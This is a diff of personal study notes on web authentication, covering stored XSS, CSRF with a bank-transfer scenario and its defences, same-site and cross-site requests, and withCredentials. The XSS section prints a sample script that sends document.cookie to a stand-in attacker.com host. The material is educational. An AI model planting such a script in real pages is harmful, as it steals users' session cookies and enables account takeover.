@@ -3,7 +3,9 @@
 1. https://www.youtube.com/watch?v=brcHK3P6ChQ (DONE)
 2. https://www.youtube.com/watch?v=X3qyxo_UTR4 (DONE)
 3. https://www.youtube.com/watch?v=oUZjO00NkhY (DONE)
-4. https://www.youtube.com/watch?v=nI8PYZNFtac
+4. https://www.youtube.com/watch?v=nI8PYZNFtac (DONE)
+
+5. https://www.youtube.com/watch?v=f2EqECiTBL8 (Nodejs)
 
 # Course
 
@@ -159,9 +161,39 @@ This cycle continues until the refresh token itself expires or is revoked. If th
 
 `SameSite attribute:`
 
-`cross-site scripting (XSS)`
-`cross-site request forgery (CSRF)`
+`cross-site scripting (XSS)`: 
+Stored (Persistent) XSS: In this type of attack, the malicious script is permanently stored on the target server (e.g., in a database), and every user who views the affected page will execute the injected script. (This could happen, for example, when user inputs are not properly validated and sanitized before being stored in a database.)
 
+. `Scenario`: Imagine a web application that allows users to post comments on a forum. The application stores these comments in a database and displays them on the forum page.
+. An attacker posts a comment containing a malicious script:
+
+<script>
+  // Malicious script to steal user cookies
+  document.location='http://attacker.com/steal?cookie=' + document.cookie;
+</script>
+
+When other users view the forum page, the injected script runs in their browsers, sending their cookies to the attacker's website.
+
+`cross-site request forgery (CSRF)`: CSRF attacks typically target actions that result in state changes on the server, and they rely on the fact that the victim is authenticated on the targeted application.
+
+. `Scenario`: 
+1. Consider an online banking application that allows users to transfer money between accounts. The application uses a simple form for money transfers.
+2. The attacker creates a malicious website or sends a link to the victim that contains a hidden form.
+3. The victim, who is logged into their online banking, visits the malicious website or clicks the link.
+4. The victim's browser, without their knowledge, sends a request to the bank's transfer endpoint, transferring money to the attacker's account.
+
+To prevent CSRF attacks, web applications implement measures like:
+`Anti-CSRF Tokens`: Including unique tokens in forms that are validated on the server side.
+`SameSite Cookies`: Restricting when cookies are sent in cross-site requests.
+`Referer Header Checking`: Verifying that requests come from the same domain.
+`Custom Headers`: Including custom headers in requests for validation.
+
+
+`Same-Site Request`: This term is used when a request is made from the same origin or website. For example, if you are on https://example.com and make a request to https://example.com/some-page, it's considered a same-site request.
+
+`Cross-Site Request`: This term is used when a request is made from one origin or website to another. For example, if you are on https://example.com and make a request to https://another-site.com/some-page, it's considered a cross-site request.
+
+`withCredentials: true`: is used to indicate whether or not cross-site Access-Control requests should include credentials (like cookies or HTTP authentication) when making a request. By setting `withCredentials: true`, you are explicitly indicating that the browser should include credentials (such as cookies) when making the request, even for cross-origin requests. This is often necessary when dealing with authentication or sessions across different domains. (to ensure that any credentials (like cookies) associated with the domain are included with the request.) It's commonly used when you have a server that serves the frontend and backend from different domains, and you want to maintain user authentication across these domains.
 
  2. Detecting Access Token Expiry:
 
